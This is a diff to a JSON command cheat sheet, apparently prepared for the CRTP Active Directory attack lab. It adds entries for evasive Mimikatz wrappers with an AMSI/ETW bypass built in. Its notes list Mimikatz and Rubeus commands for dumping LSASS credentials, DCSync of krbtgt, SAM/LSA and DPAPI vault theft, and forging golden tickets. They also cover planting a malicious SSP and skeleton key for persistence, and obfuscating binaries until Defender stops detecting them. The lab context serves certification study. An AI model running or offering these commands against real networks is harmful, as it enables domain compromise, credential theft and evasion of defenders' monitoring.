@@ -64,6 +64,14 @@
     {
       "label": "Rubeus evasive golden / silver ticket",
       "command": "Loader.exe -path <rubeus_exe> -args evasive-golden /aes256:<aes> /user:Administrator /id:500 /domain:<domain> /sid:<sid> /ptt"
+    },
+    {
+      "label": "Lab evasive Mimikatz wrapper (C:\\AD\\Tools)",
+      "command": "Invoke-MimiEx   # lab-provided PS wrapper: runs Mimikatz with AMSI/ETW bypass baked in"
+    },
+    {
+      "label": "Lab evasive cred wrapper \u2014 modify then run",
+      "command": ". C:\\AD\\Tools\\Invoke-TheKatEx-keys-stdX.ps1   # Invoke-TheKat.ps1 with the function call inlined; -vault variant for DPAPI"
     }
   ],
   "notes": "Verb map (evasive- prefix on the CRTP custom build):\n- sekurlsa::evasive-logonpasswords / evasive-keys / evasive-ekeys - creds & Kerberos keys from LSASS (T1003.001)\n- sekurlsa::evasive-pth - pass-the-hash into a new logon session\n- lsadump::evasive-dcsync /user:<domain>\\krbtgt - pull krbtgt/any hash via replication (feeds golden ticket)\n- lsadump::evasive-lsa /patch  |  lsadump::evasive-sam - LSA secrets / local SAM\n- lsadump::evasive-trust /patch - inter-realm trust keys (feeds cross-domain/forest tickets)\n- token::evasive-elevate + vault::cred /patch - elevate then dump Credential Manager/DPAPI vault (scheduled-task creds etc.)\n- misc::memssp - register a malicious SSP so future logons are logged in plaintext to C:\\Windows\\System32\\mimilsa.log (credential-capture persistence)\n- misc::skeleton - skeleton key (see crtp-skeleton-key)\n- crypto::certificates /export - export machine/user certificates (cert theft / PKINIT)\n- Rubeus evasive-golden / evasive-silver - forge tickets in-memory\nAlways run through crtp-loader (ETW/AMSI unhook). If a verb still gets flagged, obfuscate the binary (crtp-tool-obfuscation) and re-check with DefenderCheck.",
